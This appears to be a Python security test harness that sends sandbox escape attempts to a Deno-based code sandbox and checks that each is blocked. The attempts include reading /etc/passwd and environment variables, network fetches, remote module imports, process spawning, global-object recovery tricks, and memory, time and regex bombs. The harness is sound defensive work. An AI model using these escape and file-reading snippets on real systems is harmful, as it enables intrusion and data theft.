"""Attacks on the sandbox of code mode (M37), run against a real sandbox container.

A script of this file plays the app: it connects to the sandbox, sends scripts that try to get out,
answers the calls they make with canned replies, and prints one line for each attack: PASS or FAIL,
its name and what was seen. The exit status is 1 if any attack got through or any check failed.

    uv run python -m tests.sandbox_attacks --container m37b1-sandbox
    uv run python -m tests.sandbox_attacks --socket /path/to/run.sock

With --container the script talks to the supervisor through `docker exec` (the volume with the
socket need not be reachable from here) and also looks inside the container. With --socket (on the
machine that has the socket) the checks that need to look inside are skipped. Nothing in it needs
the app, a database or the network. It is not collected by pytest; the integration tests of M37
reuse its pieces.
"""

# The attacks are written as short scripts inside strings; wrapping those would hide what they do.
# ruff: noqa: E501

from __future__ import annotations

import argparse
import asyncio
import contextlib
import json
import statistics
import sys
import time
from collections.abc import Awaitable, Callable
from dataclasses import dataclass
from typing import Any

MIB = 1024 * 1024
Message = dict[str, Any]
Answer = Callable[[Message], tuple[bool, Any, float]]

FUNCTIONS = ["list_nodes", "add_note", "echo", "boom"]
DECLARATIONS = """
type Item = { ref: string; title: string };
type Page = { items: Item[]; next_cursor: string | null };
declare const vrum: {
  list_nodes(args?: { kind?: "epic" | "story" | "task"; limit?: number }): Promise<Page>;
  add_note(args: { text: string; why: string; wait?: number }): Promise<{ id: number }>;
  echo(args?: Record<string, unknown>): Promise<Record<string, unknown>>;
  boom(args?: Record<string, never>): Promise<never>;
};
"""
REFUSAL = "That is not allowed. A person has to do it on the board."


def default_answer(call: Message) -> tuple[bool, Any, float]:
    name, args = call["name"], call["args"]
    wait = float(args.get("wait", 0)) if isinstance(args.get("wait", 0), int | float) else 0.0
    if name == "boom":
        return False, REFUSAL, 0.0
    if name == "add_note":
        return True, {"id": call["seq"]}, wait
    if name == "list_nodes":
        items = [{"ref": "story:1", "title": "A story"}, {"ref": "task:2", "title": "A task"}]
        return True, {"items": items, "next_cursor": None}, 0.0
    return True, args, wait


@dataclass
class Target:
    socket: str | None
    container: str | None


class Link:
    """One connection to the supervisor: straight to its socket, or through `docker exec`."""

    def __init__(
        self,
        reader: asyncio.StreamReader,
        writer: asyncio.StreamWriter,
        process: asyncio.subprocess.Process | None,
    ) -> None:
        self.reader, self.writer, self.process = reader, writer, process

    async def send_raw(self, data: bytes) -> None:
        self.writer.write(data)
        await self.writer.drain()

    async def send(self, message: Message) -> None:
        await self.send_raw(json.dumps(message).encode() + b"\n")

    async def receive(self, timeout: float) -> Message | None:
        line = await asyncio.wait_for(self.reader.readline(), timeout)
        if not line:
            return None
        message: Message = json.loads(line)
        return message

    async def close(self) -> None:
        with contextlib.suppress(OSError):
            self.writer.close()
        if self.process is not None:
            try:
                await asyncio.wait_for(self.process.wait(), 5)
            except TimeoutError:
                self.process.kill()


async def open_link(target: Target) -> Link:
    if target.container:
        process = await asyncio.create_subprocess_exec(
            "docker",
            "exec",
            "-i",
            target.container,
            "python",
            "/sandbox/supervisor.py",
            "pipe",
            stdin=asyncio.subprocess.PIPE,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.DEVNULL,
            limit=8 * MIB,
        )
        assert process.stdout is not None and process.stdin is not None
        return Link(process.stdout, process.stdin, process)
    assert target.socket is not None
    reader, writer = await asyncio.open_unix_connection(target.socket, limit=8 * MIB)
    return Link(reader, writer, None)


@dataclass
class Outcome:
    final: Message
    calls: list[Message]
    seconds: float

    @property
    def stage(self) -> str:
        return str(self.final.get("stage", "done"))

    @property
    def text(self) -> str:
        return json.dumps(self.final)


async def reply_later(link: Link, call: Message, answer: Answer) -> None:
    ok, value, delay = answer(call)
    if delay:
        await asyncio.sleep(delay)
    reply: Message = {"op": "reply", "seq": call["seq"], "ok": ok}
    reply["result" if ok else "error"] = value
    with contextlib.suppress(OSError):
        await link.send(reply)


async def run_script(
    target: Target,
    code: str,
    *,
    timeout: float = 10,
    answer: Answer = default_answer,
    declarations: str = DECLARATIONS,
    functions: list[str] | None = None,
    **limits: Any,
) -> Outcome:
    link = await open_link(target)
    request: Message = {
        "op": "run",
        "id": "attack",
        "code": code,
        "functions": FUNCTIONS if functions is None else functions,
        "declarations": declarations,
        "timeout": timeout,
        **limits,
    }
    started = time.monotonic()
    calls: list[Message] = []
    replies: list[asyncio.Task[None]] = []
    try:
        await link.send(request)
        while True:
            message = await link.receive(timeout + 40)
            if message is None:
                raise RuntimeError("the connection closed without an answer")
            if message["op"] == "call":
                calls.append(message)
                replies.append(asyncio.create_task(reply_later(link, message, answer)))
            elif message["op"] in ("done", "fail"):
                return Outcome(message, calls, time.monotonic() - started)
            else:
                raise RuntimeError(f"an unexpected message: {message}")
    finally:
        for task in replies:
            task.cancel()
        await link.close()


async def docker_exec(container: str, *argv: str, stdin: str | None = None) -> tuple[int, str]:
    process = await asyncio.create_subprocess_exec(
        "docker",
        "exec",
        "-i",
        container,
        *argv,
        stdin=asyncio.subprocess.PIPE,
        stdout=asyncio.subprocess.PIPE,
        stderr=asyncio.subprocess.STDOUT,
    )
    out, _ = await process.communicate(stdin.encode() if stdin is not None else None)
    return process.returncode or 0, out.decode(errors="replace")


async def ping(target: Target) -> Message | None:
    link = await open_link(target)
    try:
        await link.send({"op": "ping"})
        return await link.receive(5)
    except (TimeoutError, OSError):
        return None
    finally:
        await link.close()


class Report:
    def __init__(self) -> None:
        self.failed: list[str] = []
        self.count = 0

    def line(self, name: str, problem: str | None, detail: str = "") -> None:
        self.count += 1
        if problem is None:
            print(f"PASS  {name}" + (f"  ({detail})" if detail else ""), flush=True)
        else:
            self.failed.append(name)
            print(f"FAIL  {name}  {problem}", flush=True)

    def skip(self, name: str, why: str) -> None:
        print(f"SKIP  {name}  ({why})", flush=True)

    def note(self, text: str) -> None:
        print(f"      {text}", flush=True)


def expect(
    outcome: Outcome,
    stage: str | tuple[str, ...],
    *,
    contains: tuple[str, ...] = (),
    absent: tuple[str, ...] = (),
    line: int | None = None,
) -> str | None:
    stages = (stage,) if isinstance(stage, str) else stage
    if outcome.stage not in stages:
        return f"expected {stages}, got {outcome.stage}: {outcome.text[:300]}"
    for word in contains:
        if word not in outcome.text:
            return f"the answer does not say {word!r}: {outcome.text[:300]}"
    for word in absent:
        if word in outcome.text:
            return f"the answer holds {word!r}: {outcome.text[:300]}"
    if line is not None and outcome.final.get("line") != line:
        return f"expected line {line}, got {outcome.final.get('line')}: {outcome.text[:300]}"
    return None


@dataclass
class Attack:
    name: str
    code: str
    stage: str | tuple[str, ...]
    contains: tuple[str, ...] = ()
    absent: tuple[str, ...] = ("root:",)
    line: int | None = None
    timeout: float = 10


# Each of these tries to get out. A script can get past the type check with `as any` or `@ts-ignore`,
# so the type check is no part of the defence: these reach the runner.
ATTACKS = [
    Attack(
        "read /etc/passwd",
        '// @ts-ignore\nconst text = await Deno.readTextFile("/etc/passwd");\nreturn text;',
        "error",
        ("Deno is not defined",),
        line=2,
    ),
    Attack(
        "write a file in /tmp and in /",
        '// @ts-ignore\nawait Deno.writeTextFile("/tmp/pwned", "x");\n'
        '// @ts-ignore\nawait Deno.writeTextFile("/pwned", "x");\nreturn 1;',
        "error",
        ("Deno is not defined",),
        line=2,
    ),
    Attack(
        "fetch to anywhere",
        'const f = (globalThis as any).fetch;\nreturn await f("http://1.1.1.1/");',
        "error",
        ("not a function",),
        line=2,
    ),
    Attack(
        "Deno.connect to anywhere",
        '// @ts-ignore\nconst c = await Deno.connect({ hostname: "1.1.1.1", port: 80 });\nreturn 1;',
        "error",
        ("Deno is not defined",),
    ),
    Attack(
        "read the environment",
        "// @ts-ignore\nreturn Deno.env.toObject();",
        "error",
        ("Deno is not defined",),
    ),
    Attack(
        "start a process with Deno.Command",
        '// @ts-ignore\nconst c = new Deno.Command("id");\nreturn await c.output();',
        "error",
        ("Deno is not defined",),
    ),
    Attack(
        "import a remote module (written out)",
        'await import("https://example.com/x.js");\nreturn 1;',
        "error",
        ("cannot import",),
        line=1,
    ),
    Attack(
        "import a remote module (built at run time)",
        'const where = "https://" + "example.com/x.js";\nawait import(where);\nreturn 1;',
        "error",
        ("cannot import",),
        line=2,
    ),
    Attack(
        "import jsr: and npm: modules",
        'const a = "js" + "r:@std/path";\nconst b = "np" + "m:left-pad";\n'
        "try { await import(a); } catch (e) { console.log(String(e)); }\n"
        "await import(b);\nreturn 1;",
        "error",
        ("cannot import",),
    ),
    Attack(
        "import file:///etc/passwd (written out)",
        'await import("file:///etc/passwd");\nreturn 1;',
        "error",
        ("cannot import",),
    ),
    Attack(
        "import file:///etc/passwd (built at run time)",
        'const where = "file://" + "/etc/passwd";\nawait import(where);\nreturn 1;',
        "error",
        ("cannot import",),
    ),
    Attack(
        "import a data: module that imports a file",
        "const where = \"data:text/javascript,import x from 'file:///etc/passwd';export default x\";\n"
        "await import(where);\nreturn 1;",
        "error",
        ("cannot import",),
    ),
    Attack(
        "a static import line is a syntax error",
        'import fs from "node:fs";\nreturn 1;',
        "syntax",
        ("import",),
        line=1,
    ),
    Attack(
        "a static import on line 3 is a syntax error on line 3",
        'const a = 1;\nconst b = 2;\nimport fs from "node:fs";\nreturn a + b;',
        "syntax",
        ("import",),
        line=3,
    ),
    Attack(
        "an export is a syntax error",
        "const a = 1;\nexport const b = 2;\nreturn a;",
        "syntax",
        ("export",),
        line=2,
    ),
]

BUILTINS = ["zlib", "vm", "child_process", "fs", "os", "module", "worker_threads", "net", "crypto"]
GLOBALS = [
    "Deno", "process", "require", "Buffer", "fetch", "Worker", "WebAssembly", "alert", "prompt",
    "navigator", "localStorage", "WebSocket", "XMLHttpRequest", "global", "self", "window",
    "crypto", "performance", "Request", "Response", "Blob", "URL", "TextDecoder", "setInterval",
]  # fmt: skip


def only(outcome: Outcome, check: Callable[[Any], str | None]) -> str | None:
    if outcome.stage != "done":
        return f"expected a result, got {outcome.stage}: {outcome.text[:300]}"
    return check(outcome.final["result"])


async def lines_of_attacks(target: Target, report: Report) -> None:
    for attack in ATTACKS:
        outcome = await run_script(target, attack.code, timeout=attack.timeout)
        problem = expect(
            outcome, attack.stage, contains=attack.contains, absent=attack.absent, line=attack.line
        )
        report.line(
            attack.name, problem, f"{outcome.stage}: {outcome.final.get('message', '')[:90]}"
        )


async def builtins_and_globals(target: Target, report: Report) -> None:
    code = "const out: Record<string, number> = {};\nconst names = " + json.dumps(BUILTINS) + ";\n"
    code += 'for (const n of names) { const m = await import("node:" + n); out[n] = Object.keys(m).length; }\n'
    code += "return out;"
    outcome = await run_script(target, code)
    report.line(
        "node: modules (zlib, vm, child_process, fs, os, module, worker_threads, net, crypto) are empty",
        only(
            outcome,
            lambda r: (
                None if all(v == 0 for v in r.values()) and len(r) == len(BUILTINS) else str(r)
            ),
        ),
        "no export in any",
    )
    code = "const g = globalThis as any;\nconst out: Record<string, string> = {};\nfor (const n of "
    code += json.dumps(GLOBALS) + ") out[n] = typeof g[n];\nreturn out;"
    outcome = await run_script(target, code)
    report.line(
        "Deno, process, require, fetch, Worker, WebAssembly and friends are undefined",
        only(outcome, lambda r: None if all(v == "undefined" for v in r.values()) else str(r)),
        f"{len(GLOBALS)} names",
    )
    code = (
        "const g = (Function('return this') as any)();\n"
        "const AsyncFunction = Object.getPrototypeOf(async function () {}).constructor;\n"
        "const viaAsync = await AsyncFunction('return typeof Deno + typeof process')();\n"
        "const GeneratorFunction = Object.getPrototypeOf(function* () {}).constructor;\n"
        "const viaGenerator = GeneratorFunction('yield typeof Deno')().next().value;\n"
        "const viaConstructor = (async () => {}).constructor('return typeof Deno')();\n"
        "const viaEval = eval('typeof Deno + typeof process');\n"
        "const viaIndirect = (0, eval)('typeof Deno');\n"
        "const viaThis = (function (this: any) { return this; })();\n"
        "const viaNew = new (Function as any)('return typeof Deno')();\n"
        "const viaProxy = typeof (Reflect.getPrototypeOf(globalThis) as any)?.Deno;\n"
        "return [typeof g.Deno, typeof g.process, viaAsync, viaGenerator, await viaConstructor, viaEval,"
        " viaIndirect, typeof (viaThis as any)?.Deno, viaNew, viaProxy];"
    )
    outcome = await run_script(target, code)
    report.line(
        "Function('return this')() and the AsyncFunction tricks find no Deno",
        only(
            outcome,
            lambda r: (
                None
                if all("function" not in str(v) and "object" not in str(v) for v in r)
                else str(r)
            ),
        ),
        "all undefined",
    )
    code = (
        "const names = Object.keys(vrum);\n"
        "const own = Object.getPrototypeOf(vrum);\n"
        "let frozen = false;\n"
        "try { (vrum as any).extra = 1; } catch { frozen = true; }\n"
        "return { names, own, frozen, has: 'toString' in vrum };"
    )
    outcome = await run_script(target, code)
    report.line(
        "vrum has exactly the functions it was given, frozen, with no prototype",
        only(
            outcome,
            lambda r: (
                None
                if r["names"] == FUNCTIONS and r["own"] is None and r["frozen"] and not r["has"]
                else str(r)
            ),
        ),
    )
    code = (
        "JSON.stringify = () => '\"forged\"';\n"
        "(Array.prototype as any).push = () => { throw new Error('no'); };\n"
        "(Promise.prototype as any).then = undefined;\n"
        "Object.defineProperty(Object.prototype, 'op', { get() { return 'fail'; }, configurable: true });\n"
        "const r = await vrum.echo({ a: 1 });\nreturn 5;"
    )
    outcome = await run_script(target, code)
    report.line(
        "changing JSON.stringify, Array.prototype and Object.prototype does not forge the answer",
        only(outcome, lambda r: None if r == 5 else str(r))
        if outcome.stage == "done"
        else None
        if outcome.stage in ("error", "refused", "sandbox")
        else str(outcome.text),
        f"{outcome.stage}",
    )


async def limits_and_loops(target: Target, report: Report) -> None:
    outcome = await run_script(target, "while (true) {}", timeout=3)
    problem = expect(outcome, "time", contains=("3 seconds",))
    if problem is None and not 2.5 < outcome.seconds < 9:
        problem = f"killed after {outcome.seconds:.1f} s, expected about 3"
    report.line(
        "an endless while(true){} is killed at the time limit", problem, f"{outcome.seconds:.1f} s"
    )
    answer = await ping(target)
    report.line(
        "the container still answers a ping after that",
        None if answer and answer["op"] == "pong" else str(answer),
    )
    outcome = await run_script(target, "return 1 + 1;")
    report.line("and still runs a script", only(outcome, lambda r: None if r == 2 else str(r)))
    outcome = await run_script(target, "while (true) { await Promise.resolve(); }", timeout=3)
    report.line(
        "an endless loop of promises is killed at the time limit",
        expect(outcome, "time"),
        f"{outcome.seconds:.1f} s",
    )
    outcome = await run_script(
        target, "for (;;) { await new Promise((r) => setTimeout(r, 1)); }", timeout=3
    )
    report.line(
        "an endless loop of timers is killed at the time limit",
        expect(outcome, "time"),
        f"{outcome.seconds:.1f} s",
    )
    outcome = await run_script(
        target,
        "Atomics.wait(new Int32Array(new SharedArrayBuffer(4)), 0, 0);\nreturn 1;",
        timeout=3,
    )
    report.line(
        "Atomics.wait, which blocks the thread for good, is killed at the time limit",
        expect(outcome, "time"),
        f"{outcome.seconds:.1f} s",
    )
    outcome = await run_script(target, '/(a+)+b/.test("a".repeat(60));\nreturn 1;', timeout=3)
    report.line(
        "a regular expression that never finishes is killed at the time limit",
        expect(outcome, "time"),
        f"{outcome.seconds:.1f} s",
    )
    outcome = await run_script(
        target, "const keep: unknown[] = [];\nwhile (true) keep.push(new Array(1e6).fill(1));"
    )
    report.line("a JS heap bomb is stopped", expect(outcome, "memory"), f"{outcome.seconds:.1f} s")
    outcome = await run_script(target, "const big = new Uint8Array(1.5e9);\nreturn big.length;")
    report.line(
        "an off-heap bomb (1.5 GB) is stopped, never granted",
        expect(outcome, ("memory", "error"))
        if outcome.stage != "done"
        else "the allocation succeeded",
        outcome.stage,
    )
    outcome = await run_script(
        target,
        "const keep: Uint8Array[] = [];\nfor (let i = 0; i < 100; i++) keep.push(new Uint8Array(50e6).fill(1));\nreturn keep.length;",
    )
    report.line(
        "many 50 MB buffers in a row are stopped",
        expect(outcome, ("memory", "error"))
        if outcome.stage != "done"
        else "the allocations succeeded",
        outcome.stage,
    )
    outcome = await run_script(target, 'const s = "x".repeat(2 ** 29);\nreturn s.length;')
    report.line(
        "a half gigabyte string is stopped",
        None if outcome.stage != "done" else "it succeeded",
        outcome.stage,
    )
    outcome = await run_script(
        target, "function f(n: number): number { return f(n + 1) + 1; }\nreturn f(0);"
    )
    report.line(
        "endless recursion is an error with a line",
        expect(outcome, "error", contains=("call stack",), line=1),
    )
    answer = await ping(target)
    report.line(
        "the container still answers a ping after the bombs",
        None if answer and answer["op"] == "pong" else str(answer),
    )


async def output_limits(target: Target, report: Report) -> None:
    outcome = await run_script(
        target, 'console.log("x".repeat(10_000_000));\nconsole.log("more");\nreturn 1;'
    )
    size = sum(len(entry.encode()) for entry in outcome.final.get("logs", []))
    problem = only(outcome, lambda r: None if r == 1 else str(r))
    if problem is None and (size > 16384 or not outcome.final.get("truncated_logs")):
        problem = f"logs were {size} bytes, truncated={outcome.final.get('truncated_logs')}"
    report.line("console.log of 10 MB is cut to 16 KB and says so", problem, f"{size} bytes kept")
    outcome = await run_script(
        target, 'for (let i = 0; i < 100000; i++) console.log("line " + i);\nreturn 1;'
    )
    size = sum(len(entry.encode()) for entry in outcome.final.get("logs", []))
    problem = only(outcome, lambda r: None if r == 1 else str(r))
    if problem is None and (size > 16384 or not outcome.final.get("truncated_logs")):
        problem = f"logs were {size} bytes, truncated={outcome.final.get('truncated_logs')}"
    report.line(
        "100,000 console.log lines are cut to 16 KB and say so", problem, f"{size} bytes kept"
    )
    outcome = await run_script(target, 'return "x".repeat(300000);')
    report.line(
        "a result over 256 KB is refused in words", expect(outcome, "limit", contains=("KB",))
    )
    outcome = await run_script(target, 'return "x".repeat(200000);')
    report.line(
        "a result of 200 KB is returned",
        only(outcome, lambda r: None if len(r) == 200000 else "short"),
    )
    outcome = await run_script(
        target, "for (let i = 0; i < 300; i++) await vrum.echo({ i });\nreturn 1;"
    )
    report.line(
        "300 calls: the 201st is refused as a limit, and only 200 are sent",
        expect(outcome, "limit", contains=("200 calls",))
        or (None if len(outcome.calls) == 200 else f"{len(outcome.calls)} calls were sent"),
    )
    code = (
        "for (let i = 0; i < 300; i++) { try { await vrum.echo({ i }); } catch (e) {} }\nreturn 1;"
    )
    outcome = await run_script(target, code)
    report.line(
        "a script that catches the call limit is killed after 20 more tries",
        expect(outcome, "limit", contains=("went on calling",))
        or (None if len(outcome.calls) == 200 else f"{len(outcome.calls)} calls were sent"),
    )
    outcome = await run_script(target, "//" + "x" * (2 * MIB) + "\nreturn 1;")
    report.line(
        "a script of 2 MiB is refused in words", expect(outcome, "limit", contains=("1 MB",))
    )
    outcome = await run_script(target, "//" + "x" * (800 * 1024) + "\nreturn 1;", timeout=20)
    report.line(
        "a script of 800 KB runs",
        only(outcome, lambda r: None if r == 1 else str(r)),
        f"{outcome.seconds:.1f} s",
    )
    outcome = await run_script(target, 'return await vrum.echo({ big: "x".repeat(1_100_000) });')
    report.line(
        "a call with 1.1 MB of arguments is refused in words and nothing is sent",
        expect(outcome, "refused", contains=("1 MB",))
        or (None if not outcome.calls else "it was sent"),
    )

    def big_reply(call: Message) -> tuple[bool, Any, float]:
        return True, {"data": "x" * 1_200_000}, 0.0

    outcome = await run_script(
        target, "return ((await vrum.echo({})) as any).data.length;", answer=big_reply
    )
    report.line(
        "a reply of 1.2 MB is replaced by a refusal in words",
        expect(outcome, "refused", contains=("1 MB",)),
    )


async def errors_and_lines(target: Target, report: Report) -> None:
    outcome = await run_script(target, "const a = 1;\nconst b = ;\nreturn a;")
    report.line(
        "a syntax error names its line and says it in words",
        expect(outcome, "syntax", contains=("Syntax error",), line=2),
        outcome.final.get("message", ""),
    )
    outcome = await run_script(target, "const a = {\n  x: 1,\n  y: 2\nreturn a;")
    report.line(
        "an unclosed brace names a line",
        expect(outcome, "syntax", contains=("Syntax error",))
        or (None if outcome.final.get("line") else "no line"),
        str(outcome.final.get("line")),
    )
    outcome = await run_script(target, "enum Color { Red }\nreturn Color.Red;")
    report.line(
        "an enum says it is not available, with its line",
        expect(outcome, "syntax", contains=("enum",), line=1),
    )
    outcome = await run_script(
        target, "const n: number = 1;\nconst s: number = 'x';\nreturn n + s;"
    )
    report.line(
        "a type error names its line and the problem",
        expect(
            outcome,
            "types",
            contains=("Line 2:", "not assignable"),
            absent=("file:///", ".ts:", "Deno 2"),
        ),
    )
    outcome = await run_script(
        target, 'const r = await vrum.list_node({ kind: "story" });\nreturn r;'
    )
    report.line(
        "a misspelt function gets a suggestion",
        expect(outcome, "types", contains=("Did you mean 'list_nodes'",), line=1),
    )
    outcome = await run_script(target, 'return await vrum.add_note({ text: "a", wy: "b" });')
    report.line("a misspelt argument is a type error", expect(outcome, "types", line=1))
    outcome = await run_script(
        target, "const r = await vrum.list_nodes();\nconsole.log(r.items[0].titl);\nreturn r;"
    )
    report.line(
        "a wrong field of a result is a type error on its line",
        expect(outcome, "types", contains=("titl",), line=2),
    )
    outcome = await run_script(target, "return Deno.cwd();")
    report.line(
        "naming Deno is a type error in plain words",
        expect(
            outcome,
            "types",
            contains=("Cannot find name 'Deno'", "no files, network or system"),
            absent=("deno.ns", "lib"),
        ),
    )
    outcome = await run_script(target, "return process.env;")
    report.line(
        "naming process is a type error in plain words",
        expect(outcome, "types", contains=("Cannot find name 'process'",), absent=("@types/node",)),
    )
    outcome = await run_script(
        target, "\n".join(f"const v{i}: number = 'x';" for i in range(9)) + "\nreturn 1;"
    )
    problem = expect(outcome, "types", contains=("Line 1:", "more problem"))
    if problem is None and outcome.final["message"].count("Line ") != 5:
        problem = "not five diagnostics: " + outcome.text[:300]
    report.line("at most five type errors are shown, and the rest are counted", problem)
    outcome = await run_script(target, "const x: any = null;\nreturn x.field.deeper;")
    report.line(
        "a runtime TypeError names its line",
        expect(outcome, "error", contains=("TypeError",), line=2),
    )
    outcome = await run_script(target, 'throw new Error("boom");')
    report.line(
        "a thrown Error says its message", expect(outcome, "error", contains=("boom",), line=1)
    )
    outcome = await run_script(target, 'throw "just words";')
    report.line("a thrown string is an error", expect(outcome, "error", contains=("just words",)))
    outcome = await run_script(target, "const a = 1;\nawait vrum.boom();\nreturn a;")
    report.line(
        "a refused call is VrumError with the tool's sentence",
        expect(outcome, "refused", contains=(REFUSAL,), line=2)
        or (None if len(outcome.calls) == 1 else "no call"),
    )
    outcome = await run_script(
        target,
        "try { await vrum.boom(); } catch (e) { return [e instanceof VrumError, (e as Error).name, (e as Error).message]; }",
    )
    report.line(
        "a script can catch a refusal as a VrumError",
        only(outcome, lambda r: None if r == [True, "VrumError", REFUSAL] else str(r)),
    )
    outcome = await run_script(
        target, 'vrum.echo({ wait: 0.4, n: 1 });\nvrum.echo({ wait: 0.4, n: 2 });\nreturn "early";'
    )
    problem = only(outcome, lambda r: None if r == "early" else str(r))
    if problem is None and (len(outcome.calls) != 2 or outcome.seconds < 0.4):
        problem = f"{len(outcome.calls)} calls, {outcome.seconds:.2f} s"
    report.line("calls the script never awaits are still waited for and sent", problem)
    outcome = await run_script(target, 'vrum.boom();\nreturn "x";')
    report.line(
        "a refused call nobody awaited fails the run in the tool's words",
        expect(outcome, "refused", contains=(REFUSAL,)),
    )
    outcome = await run_script(
        target,
        'setTimeout(() => { throw new Error("late"); }, 10);\nawait new Promise((r) => setTimeout(r, 100));\nreturn 1;',
    )
    report.line(
        "an error thrown in a timer fails the run", expect(outcome, "error", contains=("late",))
    )
    outcome = await run_script(target, "// @ts-ignore\nprocess.exit(3);")
    report.line(
        "process.exit is not reachable",
        expect(outcome, "error", contains=("process is not defined",)),
    )
    outcome = await run_script(target, "// @ts-ignore\nDeno.exit(3);")
    report.line(
        "Deno.exit is not reachable", expect(outcome, "error", contains=("Deno is not defined",))
    )
    outcome = await run_script(
        target,
        "const a: number[] = [3, 1, 2];\nconst t = [1, 2] as const;\nfunction first<T>(xs: T[]): T { return xs[0]; }\n"
        "const o = { a: 1 } satisfies Record<string, number>;\nreturn [first(a), t.length, o.a, Math.max(...a)];",
    )
    report.line(
        "TypeScript features are supported",
        only(outcome, lambda r: None if r == [3, 2, 1, 3] else str(r)),
    )
    code = (
        "const [a, b, c] = await Promise.all([vrum.echo({ n: 1 }), vrum.echo({ n: 2, wait: 0.2 }), vrum.list_nodes()]);\n"
        "console.log('got', JSON.stringify(a), JSON.stringify(b));\n"
        "return [a.n, b.n, c.items.length];"
    )
    outcome = await run_script(target, code)
    report.line(
        "Promise.all with several calls at once",
        only(outcome, lambda r: None if r == [1, 2, 2] else str(r))
        or (None if len(outcome.calls) == 3 else "calls"),
    )
    outcome = await run_script(target, "return undefined;")
    report.line(
        "an undefined result is null", only(outcome, lambda r: None if r is None else str(r))
    )
    outcome = await run_script(target, 'throw { toString() { throw new Error("no"); } };')
    report.line(
        "a thrown object that cannot be read is still an error in words",
        expect(outcome, "error", contains=("cannot be described",)),
    )
    outcome = await run_script(target, 'return { toJSON() { throw new Error("nope"); } };')
    report.line(
        "a result whose toJSON throws is an error in words",
        expect(outcome, "error", contains=("cannot be sent: nope",)),
    )
    outcome = await run_script(target, "await new Promise(() => {});\nreturn 1;", timeout=3)
    report.line("a promise that never settles ends at the time limit", expect(outcome, "time"))
    outcome = await run_script(
        target, "const x = { a: 1 };\nconsole.log({ p: x, q: x });\nreturn 1;"
    )
    report.line(
        "console.log of a shared reference is printed in full",
        None if outcome.final.get("logs") == ['{"p":{"a":1},"q":{"a":1}}'] else outcome.text[:200],
    )
    outcome = await run_script(target, "return { f: () => 1, big: 10n };")
    report.line(
        "a result that is not JSON is an error in words",
        expect(outcome, "error", contains=("cannot be sent",)),
    )
    outcome = await run_script(
        target, "console.log({ a: [1, 2] }, 'x', 3, null, undefined, new Error('e'));\nreturn 1;"
    )
    report.line(
        "console.log formats objects as JSON",
        only(outcome, lambda r: None)
        or (
            None
            if outcome.final["logs"] == ['{"a":[1,2]} x 3 null undefined e']
            else str(outcome.final["logs"])
        ),
    )
    outcome = await run_script(
        target,
        "await new Promise((r) => setTimeout(r, 200));\nconsole.log('slow');\nreturn 'late';",
        timeout=1,
    )
    report.line(
        "setTimeout works inside the time limit",
        only(outcome, lambda r: None if r == "late" else str(r)),
    )
    outcome = await run_script(target, "return 1;", functions=[], declarations="")
    report.line(
        "a script with no functions at all runs",
        only(outcome, lambda r: None if r == 1 else str(r)),
    )
    outcome = await run_script(
        target,
        "return await vrum.echo({ n: 1 });",
        declarations="declare const vrum: {",
        functions=["echo"],
    )
    report.line(
        "declarations that are not TypeScript are the sandbox's problem, said in words",
        expect(outcome, ("sandbox", "syntax"), contains=()),
    )


async def hostile_text(target: Target, report: Report) -> None:
    """Scripts that attack the parser and the type checker, which only read them."""
    code = (
        'const a = 1;\n/// <reference path="/etc/passwd" />\n/// <reference types="node" />\n'
        '// @ts-nocheck\n// @deno-types="file:///etc/passwd"\nreturn a;'
    )
    outcome = await run_script(target, code)
    report.line(
        "triple-slash and deno-types directives inside a script read no file",
        only(outcome, lambda r: None if r == 1 else str(r))
        if outcome.stage == "done"
        else expect(outcome, ("types", "syntax"), absent=("root:",)),
        outcome.stage,
    )
    code = (
        'let y: typeof import("/etc/passwd");\nlet z: import("file:///etc/hostname").X;\nreturn 1;'
    )
    outcome = await run_script(target, code)
    report.line(
        "a type that imports a file reads no file",
        None
        if "root:" not in outcome.text
        and "localhost" not in outcome.text.lower().replace("not-available", "")
        else outcome.text[:300],
        outcome.stage,
    )
    code = (
        "type Loop<T> = T extends any ? Loop<T[]> : never;\nconst x: Loop<1> = 1 as any;\nreturn 1;"
    )
    outcome = await run_script(target, code)
    report.line(
        "a type that never ends is stopped or refused in words",
        expect(outcome, ("types", "time", "memory", "done"))
        if outcome.seconds < 20
        else "too slow",
        f"{outcome.stage} after {outcome.seconds:.1f} s",
    )
    code = (
        "type D = 0 | 1 | 2 | 3 | 4 | 5 | 6 | 7 | 8 | 9;\n"
        "type Big = `${D}${D}${D}${D}${D}${D}${D}${D}`;\nconst x: Big = '00000000';\nreturn x;"
    )
    outcome = await run_script(target, code)
    report.line(
        "a type with a hundred million members is stopped or refused in words",
        expect(outcome, ("types", "time", "memory")) if outcome.seconds < 20 else "too slow",
        f"{outcome.stage} after {outcome.seconds:.1f} s",
    )
    outcome = await run_script(target, "(" * 200000 + "1" + ")" * 200000)
    report.line(
        "200,000 nested parentheses do not harm the sandbox",
        None
        if outcome.stage in ("syntax", "sandbox", "memory", "types", "time", "done")
        and outcome.seconds < 20
        else outcome.text[:300],
        f"{outcome.stage} after {outcome.seconds:.1f} s",
    )
    outcome = await run_script(
        target, 'const s = "a\u0000b\u2028c\ufeffd\U0001f600";\nreturn s.length;'
    )
    report.line(
        "a NUL, a line separator and an emoji inside a string are fine",
        only(outcome, lambda r: None if r == 9 else str(r))
        if outcome.stage == "done"
        else expect(outcome, ("syntax", "types", "error")),
        outcome.stage,
    )
    outcome = await run_script(target, "return 1;", declarations="declare const nothing: string;")
    report.line(
        "a script that names a function the declarations lack is a type error",
        expect(outcome, "done") if outcome.stage == "done" else None,
    )
    outcome = await run_script(target, "return vrum.echo;", functions=["echo"], declarations="")
    report.line(
        "missing declarations for a function are a type error in words",
        expect(outcome, "types", contains=("Cannot find name 'vrum'",)),
    )
    link = await open_link(target)
    await link.send(
        {
            "op": "run",
            "id": "quick",
            "code": "return 1;",
            "functions": [],
            "declarations": "",
            "timeout": 30,
        }
    )
    await link.close()
    await asyncio.sleep(2)
    report.line(
        "a client that goes away at once leaves nothing running",
        None
        if not target.container
        else (
            None if "deno" not in await processes(target.container) else "a deno is still running"
        ),
    )


async def five_at_once(target: Target, report: Report) -> None:
    hold = "await new Promise((r) => setTimeout(r, 3000));\nreturn 1;"
    first = [asyncio.create_task(run_script(target, hold, timeout=20)) for _ in range(4)]
    await asyncio.sleep(1.2)
    started = time.monotonic()
    fifth = await run_script(target, "return 1;")
    took = time.monotonic() - started
    problem = expect(fifth, "sandbox", contains=("Scripts are busy. Try again in a moment.",))
    if problem is None and took > 2:
        problem = f"the refusal took {took:.1f} s"
    report.line(
        "five runs at once: the fifth is refused in words at once", problem, f"{took:.2f} s"
    )
    results = await asyncio.gather(*first)
    report.line(
